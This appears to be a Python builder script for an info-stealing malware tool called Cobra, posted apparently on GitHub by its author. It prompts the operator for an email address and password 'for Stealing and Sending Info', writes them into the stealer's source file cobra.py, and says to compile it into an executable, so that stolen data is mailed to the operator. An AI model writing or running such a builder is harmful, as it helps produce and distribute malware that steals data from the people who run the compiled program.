#By SxNade
#https://github.com/SxNade/Cobra
#CONTRIBUTE

import os
import getpass
import time
from termcolor import colored
#importing the required libraries

golo = '''

 )   ___      ___   ______    _____    _____   
(__/_____)  /(,  ) (, /    ) (, /   ) (, /  |  
  /        /    /    /---(     /__ /    /---|  
 /        /    /  ) / ____) ) /   \_ ) /    |_ 
(______) (___ /  (_/ (     (_/      (_/        
                                               
            *By SxNade https://github.com/SxNade                                              
                                   
                                   '''

print(golo)
time.sleep(1)
print(colored("\n\n[!]Please Note That Insecure APP Access should Be enabled on the email which you specify here", "red", attrs=['bold']))

email = input("[*]Enter the Email To Be use For Stealing and Sending Info: ")
password = getpass.getpass("\n[*]Enter the Password For Email: ")
#receiving and storing the user input for password and email address

time.sleep(1)

print(colored("[+]Writing the File Now....", "green", attrs=['bold']))
time.sleep(1)

#opening and editing the file
with open('cobra.py', 'r') as file:
    data = file.readlines()
    data[10] = f'email = "{email}"'
    data[11] = '\n'
    data[12] = f'password = "{password}"'

#writing and saving the file..
with open('cobra.py', 'w') as file:
    file.writelines( data )

print(colored("\n[*]You can now compile cobra.py to a executable", 'red', attrs=['bold']))



